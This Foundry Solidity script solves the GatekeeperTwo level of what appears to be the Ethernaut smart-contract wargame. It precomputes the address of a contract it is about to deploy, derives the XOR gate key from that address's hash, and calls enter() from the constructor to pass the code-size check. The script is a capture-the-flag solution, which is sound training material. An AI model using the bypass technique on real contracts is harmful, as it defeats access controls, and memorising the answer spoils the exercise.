// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoScript is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");
        //console.log("Owner: ", GatekeeperTwo.entrant());
        vm.startBroadcast(pk);
        address gatekeeperTwoExecutorAddre = vm.computeCreateAddress(vm.addr(pk), vm.getNonce(vm.addr(pk)));
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(gatekeeperTwoExecutorAddre)))) ^ type(uint64).max);
        new GatekeeperTwoExecutor(GatekeeperTwo(vm.envAddress("GATEKEEPER_TWO_INSTANCE")), key);
        vm.stopBroadcast();
    }

    // forge script script/GatekeeperTwo.s.sol:GatekeeperTwoScript --broadcast
}

contract GatekeeperTwoExecutor { // validate the gate two
    constructor(GatekeeperTwo gatekeeperTwo, bytes8 key) {
        gatekeeperTwo.enter(key);
    }
}
